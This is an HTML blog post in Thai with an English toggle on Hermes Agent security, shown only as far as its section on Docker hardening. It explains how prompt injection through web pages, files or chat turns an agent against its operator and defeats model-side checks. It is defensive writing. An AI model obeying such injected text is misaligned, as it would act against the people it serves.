@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hermes Security — Isolation คือแนวป้องกันเดียวที่จริง | Anirach Mingkhwan</title>
+  <meta name="description" content="Hermes Agent ยอมรับตรง ๆ ใน SECURITY.md ว่า isolation ระดับ OS คือแนวป้องกันเดียวที่จริง — บทความนี้ไล่ดูแนวป้องกันทุกชั้น บันทึก CVE หกเดือนแรก เหตุการณ์ YOLO mode ในกระทรวงการคลังไทย และ checklist ก่อนเปิดใช้ในองค์กร">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Sarabun:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      color-scheme: light;
+      /* ink */
+      --navy: #11304b; --slate: #334155; --slate-light: #526174; --gray: #94a3b8;
+      /* ground */
+      --bg: #faf7f0; --white: #ffffff; --code-bg: #1e293b;
+      /* accent */
+      --blue: #226299; --blue-dark: #1a4d7a; --blue-light: #4992b9;
+      /* brand — sampled from the book covers. --gold is decorative on light grounds (2.2:1); --gold-dark is its text form. */
+      --gold: #c4a46c; --gold-dark: #7a5f22; --cloud: #dee7e6; --parchment: #e9e1c4; --focus: #226299;
+      /* status — use only these six, never invent a seventh */
+      --green: #22c55e; --red: #ef4444; --amber: #f59e0b;
+      --cyan: #06b6d4; --purple: #226299; --purple-dark: #1a4d7a;
+      /* type */
+      --font: 'Inter', 'Sarabun', -apple-system, BlinkMacSystemFont, sans-serif;
+      --mono: 'JetBrains Mono', 'Fira Code', 'Sarabun', monospace;
+      /* form */
+      --radius: 12px; --radius-sm: 8px; --radius-lg: 16px;
+      --measure: 720px; --wide: 860px;
+      --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    html { scroll-behavior: smooth; }
+    body { font-family: var(--font); font-size: 17px; line-height: 1.8; color: var(--slate); background: var(--bg); -webkit-font-smoothing: antialiased; }
+    .blog-nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(248,250,252,0.85); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(0,0,0,0.05); }
+    .blog-nav__inner { max-width: 860px; margin: 0 auto; padding: 0 2rem; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .blog-nav__back { font-size: 0.85rem; font-weight: 500; color: var(--blue); text-decoration: none; }
+    .blog-nav__back:hover { color: #1a4d7a; }
+    .blog-nav__title { font-size: 0.85rem; font-weight: 600; color: var(--navy); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 50%; }
+    /* ── HERO ── house .post-hero on the approved Deep Blue gradient (page-design
+       §5 / INV-28). Ink is inverted for the dark ground: white title/meta, tag
+       pills white on 18% white — the openclaw-production treatment. The
+       background value must stay byte-identical to the approved string. */
+    .post-hero { padding: 8rem 2rem 3rem; background: linear-gradient(135deg, #11304b 0%, #1a4d7a 45%, #226299 100%); color: #fff; text-align: center; }
+    .post-hero__tags { display: flex; gap: 0.5rem; justify-content: center; margin-bottom: 1.25rem; flex-wrap: wrap; }
+    .post-hero__tag { display: inline-block; font-size: 0.72rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: #fff; background: rgba(255,255,255,0.18); padding: 0.35rem 0.9rem; border-radius: 20px; }
+    .post-hero__title { font-size: clamp(1.8rem, 5vw, 3rem); font-weight: 800; color: #fff; line-height: 1.2; margin-bottom: 1rem; max-width: 720px; margin-left: auto; margin-right: auto; }
+    .post-hero__sub { font-size: 1.05rem; max-width: 640px; margin: 0 auto 1.5rem; line-height: 1.7; color: #fff; }
+    .post-hero__meta { font-size: 0.85rem; color: #fff; display: flex; align-items: center; justify-content: center; gap: 1.5rem; flex-wrap: wrap; }
+    .post-hero__series { font-weight: 600; color: #fff; }
+    /* the switch pill and the focus ring both sit on the dark hero: the pill is
+       a light chip so its labels keep their light-ground colours, and --focus
+       re-points to gold here (blue collapses on blue — the footer/<pre>
+       precedent). */
+    .post-hero { --focus: var(--gold); }
+    .post-hero__cover {
+      aspect-ratio: 1 / 1;
+      max-width: 380px;
+      margin: 2.5rem auto 0;
+      border-radius: var(--radius-lg, 16px);
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(17,48,75,0.14);
+    }
+    .post-hero__cover img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .post-body { max-width: 720px; margin: 0 auto; padding: 3rem 2rem 6rem; }
+    .post-body h2 { font-size: 1.6rem; font-weight: 800; color: var(--navy); margin: 3rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 2px solid rgba(34,98,153,0.15); }
+    .post-body h3 { font-size: 1.25rem; font-weight: 700; color: var(--navy); margin: 2.25rem 0 0.75rem; }
+    .post-body p { margin-bottom: 1.25rem; }
+    .post-body strong { font-weight: 700; color: var(--navy); }
+    .post-body a { color: var(--blue); text-decoration: underline; text-decoration-thickness: 1px; text-underline-offset: 2px; }
+    .post-body ul, .post-body ol { margin: 0.5rem 0 1.25rem 1.5rem; }
+    .post-body li { margin-bottom: 0.4rem; }
+    .post-body blockquote { background: rgba(34,98,153,0.06); border-left: 4px solid var(--blue); padding: 1rem 1.25rem; border-radius: 0 10px 10px 0; margin: 1.25rem 0; font-size: 0.95rem; color: var(--navy); }
+    .post-body hr { border: none; height: 1px; background: linear-gradient(90deg, transparent, rgba(34,98,153,0.2), transparent); margin: 3rem 0; }
+    /* ── CODE ── */
+    .post-body pre { background: var(--code-bg); border-radius: 12px; padding: 1.5rem; margin: 1.25rem 0 1.5rem; overflow-x: auto; border: 1px solid rgba(255,255,255,0.05); }
+    .post-body pre code { font-family: var(--mono); font-size: 0.85rem; color: #e2e8f0; line-height: 1.7; background: none; padding: 0; white-space: pre-wrap; }
+    .post-body code { font-family: var(--mono); font-size: 0.88em; background: rgba(34,98,153,0.08); color: var(--blue-dark); padding: 0.15em 0.45em; border-radius: 5px; }
+    /* ── TABLES ── */
+    .table-wrapper { overflow-x: auto; margin: 1.5rem 0; border-radius: 0.5rem; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1); }
+    table { width: 100%; border-collapse: collapse; background: white; }
+    th { background: #226299; color: white; padding: 1rem; text-align: left; font-weight: 600; }
+    td { padding: 1rem; border-bottom: 1px solid #e5e7eb; }
+    .post-body table { display: block; width: 100%; overflow-x: auto; }
+    /* ── ALERTS ── */
+    .alert { background: #fef3cd; border: 1px solid #facc15; border-radius: 0.5rem; padding: 1rem; margin: 1.5rem 0; }
+    .alert.danger { background: #fee2e2; border-color: #ef4444; }
+    .alert.info { background: #e0f2fe; border-color: #06b6d4; }
+    .alert.success { background: #d1fae5; border-color: #10b981; }
+    /* ── KEY TAKEAWAYS ── */
+    .key-takeaways { background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%); border-radius: 1rem; padding: 2rem; margin: 3rem 0; }
+    .key-takeaways h3 { color: #226299; margin-bottom: 1.5rem; }
+    .post-series-footer { text-align: center; font-size: 0.85rem; color: var(--slate-light); font-style: italic; margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #e2e8f0; }
+    .blog-footer { background: var(--navy); padding: 2rem 0; text-align: center; }
+    .blog-footer a { color: var(--gold); text-decoration: none; font-weight: 600; font-size: 0.9rem; }
+    .blog-footer span { color: var(--gray); font-size: 0.8rem; display: block; margin-top: 0.4rem; }
+    @media (max-width: 600px) {
+      .post-hero { padding: 7rem 1.25rem 2.5rem; }
+      .post-body { padding: 2rem 1.25rem 4rem; }
+      .post-hero__meta { flex-direction: column; gap: 0.4rem; }
+      .post-body h2 { font-size: 1.4rem; }
+      .post-body h3 { font-size: 1.15rem; }
+      .post-body pre { padding: 1rem; border-radius: 8px; }
+    }
+
+    :focus-visible { outline: 2px solid var(--focus); outline-offset: 3px; border-radius: 2px; }
+    /* the ring sits on the page ground (3px offset). Inside the navy footers
+       and code blocks var(--blue) collapses to 2.12:1, so those scopes
+       re-point --focus to gold (5.73:1 on navy). */
+    .footer, .blog-footer, pre { --focus: var(--gold); }
+    :focus:not(:focus-visible) { outline: none; }
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: .01ms !important; animation-iteration-count: 1 !important;
+        transition-duration: .01ms !important; scroll-behavior: auto !important;
+      }
+    }
+    h1, h2, h3, .post-hero__title, .card__title { text-wrap: balance; }
+
+    .post-body img, .post-body svg { max-width: 100%; height: auto; }
+
+    /* ── SKIP LINK ── a11y-perf R5: the link and the landmark it targets are a
+       pair — useless without both halves. Off-screen until focused, then the
+       first tab stop on every page. */
+    .skip-link { position: absolute; left: -9999px; }
+    .skip-link:focus {
+      left: 1rem; top: 1rem; z-index: 999;
+      background: var(--navy); color: #fff;
+      padding: 0.75rem 1.25rem; border-radius: var(--radius-sm);
+      font-weight: 600; text-decoration: none;
+    }
+
+    /* ── POST WAYFINDING ── the wordmark is the home link; the footer carries
+       the full destination row. */
+    .blog-nav__home {
+      font-size: 0.9rem; font-weight: 800; color: var(--navy);
+      text-decoration: none; margin-right: 1rem;
+    }
+    .blog-nav__home:hover { color: var(--blue); }
+    .blog-nav__inner > .blog-nav__back { margin-right: auto; }
+    .blog-footer__nav {
+      display: flex; flex-wrap: wrap; justify-content: center; gap: 0.35rem 1.25rem;
+      max-width: 860px; margin: 0 auto 1.25rem; padding: 0 2rem 1.25rem;
+      border-bottom: 1px solid rgba(255,255,255,0.12);
+    }
+    .blog-footer__nav a { color: var(--gold); font-size: 0.85rem; font-weight: 600; text-decoration: none; }
+    .blog-footer__nav a:hover { color: #fff; text-decoration: underline; }
+
+    html { scroll-padding-top: 5rem; }
+    [id] { scroll-margin-top: 5rem; }
+
+    /* Thai needs more room than Latin at the same nominal size. */
+    .post-body:lang(th) { font-size: 18px; line-height: 1.85; }
+    .post-body p, .post-body li, .post-body blockquote { text-wrap: pretty; }
+
+    /* ---- side-scroll affordance ----
+       pre blocks and tables can exceed 720px. These layers paint a shadow ONLY
+       where there is more content in that direction; when fully scrolled the
+       cover slides over the shadow and hides it. No JavaScript, no wrapper. */
+    .post-body pre, .post-body table {
+      overflow-x: auto;
+      background-image:
+        linear-gradient(to right, var(--code-bg, #0f172a) 30%, rgba(15,23,42,0)),
+        linear-gradient(to left, var(--code-bg, #0f172a) 30%, rgba(15,23,42,0)),
+        radial-gradient(farthest-side at 0 50%, rgba(0,0,0,.28), rgba(0,0,0,0)),
+        radial-gradient(farthest-side at 100% 50%, rgba(0,0,0,.28), rgba(0,0,0,0));
+      background-position: 0 0, 100% 0, 0 0, 100% 0;
+      background-repeat: no-repeat;
+      background-size: 40px 100%, 40px 100%, 14px 100%, 14px 100%;
+      background-attachment: local, local, scroll, scroll;
+    }
+    .post-body table {
+      background-image:
+        linear-gradient(to right, var(--white, #fff) 30%, rgba(255,255,255,0)),
+        linear-gradient(to left, var(--white, #fff) 30%, rgba(255,255,255,0)),
+        radial-gradient(farthest-side at 0 50%, rgba(17,48,75,.16), rgba(17,48,75,0)),
+        radial-gradient(farthest-side at 100% 50%, rgba(17,48,75,.16), rgba(17,48,75,0));
+      background-position: 0 0, 100% 0, 0 0, 100% 0;
+      background-repeat: no-repeat;
+      background-size: 40px 100%, 40px 100%, 14px 100%, 14px 100%;
+      background-attachment: local, local, scroll, scroll;
+    }
+
+    /* ---- table of contents ---- */
+    .post-toc {
+      max-width: 720px;
+      margin: 2rem auto 0;
+      padding: 1rem 1.25rem;
+      background: rgba(34,98,153,0.05);
+      border: 1px solid rgba(34,98,153,0.14);
+      border-left: 3px solid var(--gold, #c4a46c);
+      border-radius: 10px;
+      font-size: 0.92rem;
+    }
+    .post-toc > summary {
+      cursor: pointer;
+      font-weight: 700;
+      color: var(--navy);
+      list-style: none;
+    }
+    .post-toc > summary::-webkit-details-marker { display: none; }
+    .post-toc > summary::before {
+      content: "\25B8";
+      display: inline-block;
+      margin-right: 0.5rem;
+      transition: transform 0.2s ease;
+      color: var(--gold-dark, #7a5f22);
+    }
+    .post-toc[open] > summary::before { transform: rotate(90deg); }
+    .post-toc > summary:focus-visible { outline: 3px solid var(--focus, #226299); outline-offset: 3px; }
+    .post-toc ol { margin: 0.85rem 0 0.25rem; padding-left: 1.4rem; }
+    .post-toc li { margin-bottom: 0.4rem; line-height: 1.5; }
+    .post-toc a { color: var(--slate); text-decoration: none; }
+    .post-toc a:hover, .post-toc a:focus-visible { color: var(--blue-dark, #1a4d7a); text-decoration: underline; }
+    @media (max-width: 600px) { .post-toc { margin: 1.25rem 1rem 0; } }
+
+    /* ---- cross-document view transitions ---- */
+    @view-transition { navigation: auto; }
+    .nav, .blog-nav { view-transition-name: site-nav; }
+    .footer, .blog-footer { view-transition-name: site-footer; }
+    @media (prefers-reduced-motion: reduce) {
+      ::view-transition-group(*),
+      ::view-transition-old(*),
+      ::view-transition-new(*) { animation: none !important; }
+    }
+
+    /* ── SERIES STRIP — Hermes Agent in Practice ──
+       Same class and inner-wrapper shape as the OpenClaw strip because the
+       linter's RE_SNAV recognises exactly `series-nav` + a nested div; a
+       renamed strip would read as "no nav" and fail INV-08. All content
+       checks (INV-03 family) iterate the SERIES7 list only, so this strip's
+       labels are convention, not contract. House-styled, not the island CSS. */
+    .series-nav {
+      max-width: 720px; margin: 2rem auto 0; padding: 1.1rem 1.4rem;
+      background: rgba(255,255,255,0.75); border: 1px solid rgba(34,98,153,0.15);
+      border-left: 3px solid var(--gold); border-radius: 12px;
+    }
+    .series-nav h3 {
+      font-size: 0.78rem; font-weight: 700; text-transform: uppercase;
+      letter-spacing: 0.08em; color: var(--gold-dark); margin-bottom: 0.6rem;
+    }
+    .series-links { display: flex; flex-wrap: wrap; gap: 0.5rem; }
+    .series-links a, .series-links .current {
+      font-size: 0.82rem; font-weight: 600; padding: 0.35rem 0.8rem;
+      border-radius: 50px; text-decoration: none;
+    }
+    .series-links a { color: var(--blue-dark); background: rgba(34,98,153,0.08); }
+    .series-links a:hover { background: rgba(34,98,153,0.16); }
+    .series-links .current { color: #fff; background: var(--blue-dark); }
+    @media (max-width: 600px) { .series-nav { margin: 1.5rem 1rem 0; } }
+
+    /* ── LANGUAGE SWITCH — pure CSS, zero JavaScript (INV-38) ──
+       One visually-hidden checkbox as a direct child of body, BEFORE the main landmark,
+       so `#langSwitch:checked ~ main …` reaches every content block. The two
+       tracks are paired blocks: .l-th (default) and .l-en (hidden until
+       checked; display:revert restores block for divs, inline for spans).
+       Naming stays clear of INV-12's menu-token regex (hamburger|burger|
+       nav__toggle|nav-toggle|navtoggle|menu-toggle|menu__toggle) — verified.
+       No JS also means no persistence across posts; each post opens in Thai. */
+    .lang-switch-box { position: absolute; left: -9999px; }
+    .l-en { display: none; }
+    #langSwitch:checked ~ main .l-en { display: revert; }
+    #langSwitch:checked ~ main .l-th { display: none; }
+    .lang-switch {
+      display: inline-flex; align-items: center; gap: 0.55rem;
+      margin-top: 1.4rem; padding: 0.4rem 1.1rem; border-radius: 50px;
+      background: rgba(255,255,255,0.85); border: 1px solid rgba(255,255,255,0.4);
+      cursor: pointer; font-size: 0.85rem; user-select: none;
+    }
+    .lang-switch span { color: var(--slate-light); font-weight: 600; transition: color 0.2s; }
+    .lang-switch .lang-sep { color: var(--gray); font-weight: 400; }
+    .lang-switch .lang-th { color: var(--navy); font-weight: 800; }
+    #langSwitch:checked ~ main .lang-switch .lang-th { color: var(--slate-light); font-weight: 600; }
+    #langSwitch:checked ~ main .lang-switch .lang-en { color: var(--navy); font-weight: 800; }
+    .lang-switch:hover { border-color: #fff; }
+    #langSwitch:focus-visible ~ main .lang-switch {
+      outline: 2px solid var(--focus); outline-offset: 3px;
+    }
+  </style>
+  <!-- social -->
+  <link rel="canonical" href="https://anirach.com/blog/hermes-security.html">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://anirach.com/blog/hermes-security.html">
+  <meta property="og:site_name" content="Anirach Mingkhwan">
+  <meta property="og:locale" content="th_TH">
+  <meta property="article:published_time" content="2026-09-01">
+  <meta property="article:author" content="https://anirach.com/">
+  <meta property="og:title" content="Security — Isolation คือแนวป้องกันเดียวที่จริง">
+  <meta property="og:description" content="Hermes Agent ยอมรับตรง ๆ ใน SECURITY.md ว่า isolation ระดับ OS คือแนวป้องกันเดียวที่จริง — บทความนี้ไล่ดูแนวป้องกันทุกชั้น บันทึก CVE หกเดือนแรก เหตุการณ์ YOLO mode ในกระทรวงการคลังไทย และ checklist ก่อนเปิดใช้ในองค์กร">
+  <meta itemprop="image" property="og:image" content="https://anirach.com/images/hermes-security-og.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="Security — Isolation คือแนวป้องกันเดียวที่จริง">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://anirach.com/images/hermes-security-og.jpg">
+  <meta name="twitter:image:alt" content="Security — Isolation คือแนวป้องกันเดียวที่จริง">
+  <meta name="robots" content="max-image-preview:large">
+  <meta name="theme-color" content="#11304b">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  <!-- /social -->
+</head>
+<body>
+<a href="#main" class="skip-link">Skip to content</a>
+<input type="checkbox" id="langSwitch" class="lang-switch-box" aria-label="Switch language: Thai / English">
+
+  <nav class="blog-nav">
+    <div class="blog-nav__inner">
+      <a href="../index.html" class="blog-nav__home">Anirach</a>
+      <a href="./" class="blog-nav__back">‹ Blog</a>
+      <div class="blog-nav__title">Security · แนวป้องกันเดียวที่จริง</div>
+    </div>
+  </nav>
+
+  <main id="main">
+
+  <header class="post-hero">
+    <div class="post-hero__tags">
+      <span class="post-hero__tag">Hermes</span>
+      <span class="post-hero__tag">AI Agents</span>
+      <span class="post-hero__tag">Security</span>
+    </div>
+    <h1 class="post-hero__title" itemprop="headline"><span class="l-th">Security — Isolation คือแนวป้องกันเดียวที่จริง</span><span class="l-en" lang="en">Security — Isolation Is the Only Real Boundary</span></h1>
+    <p class="post-hero__sub"><span class="l-th">ไล่ดูแนวป้องกันทุกชั้นของ Hermes Agent — จาก Docker hardening ถึง DM pairing — พร้อมบันทึก CVE ตัวจริง และเหตุการณ์ YOLO mode ที่กระทรวงการคลังไทย</span><span class="l-en" lang="en">A walk through every defense layer Hermes ships — from Docker hardening to DM pairing — plus the real CVE record and the YOLO-mode incident inside Thailand's Ministry of Finance.</span></p>
+    <div class="post-hero__meta">
+      <span>By <strong>Anirach Mingkhwan</strong></span>
+      <span class="post-hero__series">Hermes Agent in Practice 2026 • Post #4</span>
+      <span><time datetime="2026-09-01" itemprop="datePublished">1 Sep 2026</time></span>
+      <span>16 min read</span>
+    </div>
+    <label for="langSwitch" class="lang-switch" title="สลับภาษา · Switch language"><span class="lang-th">ไทย</span><span class="lang-sep">·</span><span class="lang-en" lang="en">English</span></label>
+    <div class="post-hero__cover">
+      <img src="../images/hermes-security-cover.jpg" alt="Security — Isolation คือแนวป้องกันเดียวที่จริง" width="800" height="800" loading="eager" fetchpriority="high" decoding="async">
+    </div>
+  </header>
+
+  <nav aria-label="Hermes Agent in Practice">
+  <div class="series-nav">
+    <h3>⚡ Hermes Agent in Practice 2026</h3>
+    <div class="series-links">
+        <a href="/blog/hermes-101">#1 Hermes 101</a>
+        <a href="/blog/hermes-agent-teams">#2 Agent Teams</a>
+        <a href="/blog/hermes-memory">#3 Memory</a>
+        <span class="current" aria-current="page">#4 Security</span>
+        <a href="/blog/hermes-integrations">#5 Integrations</a>
+        <a href="/blog/hermes-skills">#6 Skills</a>
+        <a href="/blog/hermes-production">#7 Production</a>
+    </div>
+  </div>
+  </nav>
+
+  <article class="post-body" itemscope itemtype="https://schema.org/BlogPosting">
+    <span itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Anirach Mingkhwan"></span>
+
+    <details class="post-toc l-th" open>
+      <summary>ในบทความนี้</summary>
+      <ol>
+          <li><a href="#th-premise">คำสารภาพที่ตรงที่สุดในวงการ: OS-Level Isolation หรือไม่มีอะไรเลย</a></li>
+          <li><a href="#th-backends">Terminal Backends และ Docker Hardening</a></li>
+          <li><a href="#th-approvals">Approvals, YOLO Mode และ Hardline Blocklist</a></li>
+          <li><a href="#th-secrets">Secrets และ File-Write Guards — และขีดจำกัดที่เอกสารยอมรับเอง</a></li>
+          <li><a href="#th-injection">Prompt Injection, Tirith และ SSRF Defense</a></li>
+          <li><a href="#th-channels">ใครเข้ามาคุยได้บ้าง: Default-Deny และ DM Pairing</a></li>
+          <li><a href="#th-cves">บันทึก CVE: หกเดือนแรกพังอะไรไปบ้าง</a></li>
+          <li><a href="#th-incidents">เหตุการณ์จริง: เมื่อ YOLO กลายเป็นฟีเจอร์ของผู้โจมตี</a></li>
+          <li><a href="#th-checklist">Hardening Checklist สำหรับองค์กร — และช่องว่างที่ยังเหลือ</a></li>
+      </ol>
+    </details>
+    <details class="post-toc l-en" open>
+      <summary>In this post</summary>
+      <ol>
+          <li><a href="#en-premise">The Most Honest Line in Agent Security: OS-Level Isolation or Nothing</a></li>
+          <li><a href="#en-backends">Terminal Backends and Docker Hardening</a></li>
+          <li><a href="#en-approvals">Approvals, YOLO Mode, and the Hardline Blocklist</a></li>
+          <li><a href="#en-secrets">Secrets and File-Write Guards — and Their Admitted Limits</a></li>
+          <li><a href="#en-injection">Prompt Injection, Tirith, and SSRF Defense</a></li>
+          <li><a href="#en-channels">Who Gets to Talk to It: Default-Deny and DM Pairing</a></li>
+          <li><a href="#en-cves">The CVE Record: What the First Six Months Broke</a></li>
+          <li><a href="#en-incidents">Incidents in the Wild: When YOLO Became an Attacker Feature</a></li>
+          <li><a href="#en-checklist">A Hardening Checklist for Organizations — and the Gaps That Remain</a></li>
+      </ol>
+    </details>
+    <div class="l-th">
+
+    <p>🤔 ก่อนอ่านบทความนี้ ผมอยากให้คุณถามตัวเองด้วยคำถามเดียว: ถ้าวันหนึ่ง AI agent ที่คุณให้สิทธิ์รันคำสั่งบนเครื่องจริง ถูก <strong>prompt injection</strong> หลอกจนกลายเป็นฝ่ายตรงข้ามของคุณเอง — อะไรคือสิ่งสุดท้ายที่ยังหยุดมันได้? Approval dialog? Denylist? Scanner? หรือไม่มีอะไรเลย?</p>
+
+    <p>ผู้อ่านซีรีส์ OpenClaw for Organizations ของผมคงจำได้ว่าผมไล่คำถามนี้ไว้แล้วใน <a href="/blog/openclaw-security">OpenClaw Security</a> — ยุคที่ gateway เปิดโล่งบนอินเทอร์เน็ตและ skill ปนเปื้อนใน marketplace กลายเป็นข่าวรายสัปดาห์ Hermes Agent ของ Nous Research เปิดตัวสาธารณะเมื่อ 25 กุมภาพันธ์ 2026 หลังจากเห็นบาดแผลพวกนั้นทั้งหมด และออกแบบสวนทางแทบทุกข้อ: channel เป็น default-deny, DM ต้องผ่าน pairing code, dashboard เป็น fail-closed, skill ทุกตัวถูกสแกนก่อนติดตั้ง</p>
+
+    <p>แต่สิ่งที่ทำให้ผมนับถือเอกสารของ Hermes มากที่สุดกลับไม่ใช่ฟีเจอร์เหล่านั้น — มันคือประโยคเดียวใน SECURITY.md ที่ยอมรับตรง ๆ ว่าทุกชั้นที่เพิ่งไล่มาเป็นเพียง damage reduction ส่วนแนวป้องกันที่ &laquo;จริง&raquo; มีอยู่ชั้นเดียว บทความนี้จะไล่ดูทุกชั้นอย่างละเอียด แล้วเทียบกับสิ่งที่เกิดขึ้นจริงในหกเดือนแรก ซึ่งรวมถึงเหตุการณ์ที่เจ็บที่สุดสำหรับคนไทยอย่างเรา — Hermes ในโหมด YOLO วิ่งอยู่ในเครือข่ายกระทรวงการคลังไทยโดยไม่มีใครนั่งคุม</p>
+
+    <h2 id="th-premise">คำสารภาพที่ตรงที่สุดในวงการ: OS-Level Isolation หรือไม่มีอะไรเลย</h2>
+
+    <p>เอกสารความปลอดภัยของแทบทุก agent framework ชอบวาดภาพ &laquo;หลายชั้นป้องกันที่แข็งแรง&raquo; แต่ <a href="https://github.com/NousResearch/hermes-agent/security">SECURITY.md ของ Hermes</a> เปิดด้วยจุดยืนที่ตรงกันข้าม: มันประกาศว่า <strong>OS-level isolation</strong> คือ security boundary ที่แท้จริง<em>เพียงชั้นเดียว</em>เมื่อต้องรับมือกับพฤติกรรม adversarial ของ LLM — ส่วน approvals, denylists และ scanners ทั้งหลายเป็นเพียงเครื่องมือลดความเสียหาย ไม่ใช่กำแพง</p>
+
+    <blockquote>💡 ถอดความจากจุดยืนของ SECURITY.md: &laquo;ถ้าโมเดลตัดสินใจเป็นปฏิปักษ์กับคุณจริง ๆ สิ่งเดียวที่หยุดมันได้คือขอบเขตที่ระบบปฏิบัติการบังคับ ไม่ใช่ prompt ไม่ใช่ filter&raquo; — นี่คือสมมติฐานที่ทั้งบทความนี้จะยึดเป็นแกน</blockquote>
+
+    <p>ทำไมข้อนี้ถึงสำคัญ? เพราะภัยคุกคามหลักของ agent ไม่ใช่ hacker ที่เจาะ process จากข้างนอก แต่คือ<strong>ตัวโมเดลเองที่ถูกป้อนข้อความปนเปื้อน</strong> — จากเว็บที่มันไปอ่าน จากไฟล์ในโปรเจกต์ จากข้อความในแชท เมื่อคำสั่งอันตรายมาจาก &laquo;สมอง&raquo; ของ agent เอง ทุกกลไกที่พึ่งพาการตัดสินใจของโมเดลก็ล้มพร้อมกันหมด เหลือแต่สิ่งที่ kernel บังคับจริง ๆ</p>
+
+    <p>กระบวนการรายงานช่องโหว่ก็เรียบง่าย: รายงานแบบ private ผ่าน GitHub Security Advisories หรืออีเมล security@nousresearch.com มีกรอบเปิดเผย 90 วัน และ<strong>ไม่มี bug bounty</strong> ข้อสังเกตหนึ่งที่ผมเช็คเองแล้วรู้สึกแปลก: ตอนที่เขียนอยู่นี้ แท็บ Security Advisories ของ repo ยังแสดง advisory ที่เผยแพร่แล้ว<em>เป็นศูนย์</em> ทั้งที่ NVD มี CVE ของ hermes-agent อยู่จริงหลายรายการ (เดี๋ยวเราจะไปดูกันในหัวข้อ CVE) — แปลว่า CVE ไหลผ่าน NVD โดยไม่ผ่านหน้า advisory ของ repo ซึ่งทำให้ admin ที่ subscribe แค่ repo อาจพลาดข่าวช่องโหว่ได้</p>
+
+    <h2 id="th-backends">Terminal Backends และ Docker Hardening</h2>
+
+    <p>ชั้น isolation ของ Hermes เริ่มที่คำถามว่า &laquo;คำสั่ง shell ของ agent ไปรันที่ไหน&raquo; README ระบุ backend ไว้เจ็ดตัว: local, Docker, SSH, Singularity, Modal, Daytona และ Vercel Sandbox โดยพฤติกรรมด้านความปลอดภัยต่างกันชัดเจน:</p>
+
+    <div class="table-wrapper">
+        <table>
+            <thead>
+                <tr>
+                    <th>Backend</th>
+                    <th>คำสั่งรันที่ไหน</th>
+                    <th>Dangerous-command checks</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>local</strong></td>
+                    <td>เครื่อง host โดยตรง สิทธิ์เท่า user</td>
+                    <td>เปิด</td>
+                </tr>
+                <tr>
+                    <td><strong>ssh</strong></td>
+                    <td>เครื่อง remote ผ่าน SSH</td>
+                    <td>เปิด</td>
+                </tr>
+                <tr>
+                    <td><strong>docker / singularity</strong></td>
+                    <td>container บนเครื่องคุณ</td>
+                    <td>ปิด — container คือ boundary</td>
+                </tr>
+                <tr>
+                    <td><strong>modal / daytona / vercel_sandbox</strong></td>
+                    <td>sandbox บน cloud ของผู้ให้บริการ</td>
+                    <td>ปิด — sandbox คือ boundary</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p>สังเกตตรรกะที่สอดคล้องกับ premise ข้อแรก: ใน backend แบบ container เอกสารบอกว่า Hermes <em>ข้าม</em> dangerous-command checks ไปเลย เพราะถือว่า container เป็นแนวป้องกันตัวจริงอยู่แล้ว — การกรองคำสั่งเป็นของจำเป็นเฉพาะเมื่อคำสั่งวิ่งบน host ที่ไม่มีอะไรกั้น ตั้งค่าใน <code>config.yaml</code> ได้แบบนี้:</p>
+
+    <pre><code># ~/.hermes/config.yaml
+terminal:
+  backend: docker          # local | docker | ssh | singularity | modal | daytona | vercel_sandbox
+  container_cpu: 1         # ค่า default: 1 vCPU
+  container_memory: 5120   # ค่า default: 5120 MB
+  container_disk: 51200    # ค่า default: 51200 MB</code></pre>
+
+    <p>และเมื่อเลือก Docker แล้ว Hermes ไม่ได้รัน container เปล่า ๆ — ค่า default ของมันแข็งกว่าที่หลายทีม DevOps ตั้งเองด้วยซ้ำ เทียบเท่ากับการรันด้วย flags ชุดนี้:</p>
+
+    <pre><code># สิ่งที่ Docker hardening ค่า default ของ Hermes ทำให้ (เทียบเท่า)
+docker run \
+  --cap-drop ALL \                       # ตัด Linux capabilities ทิ้งทั้งหมดก่อน
+  --cap-add DAC_OVERRIDE \               # แล้วคืนเฉพาะที่จำเป็นสามตัว
+  --cap-add CHOWN \
+  --cap-add FOWNER \
+  --security-opt no-new-privileges \     # ห้าม escalate สิทธิ์ผ่าน setuid
+  --pids-limit 256 \                     # กัน fork bomb ระดับ kernel
+  --tmpfs /tmp:nosuid,noexec ...         # /tmp เขียนได้แต่รัน binary ไม่ได้</code></pre>
+
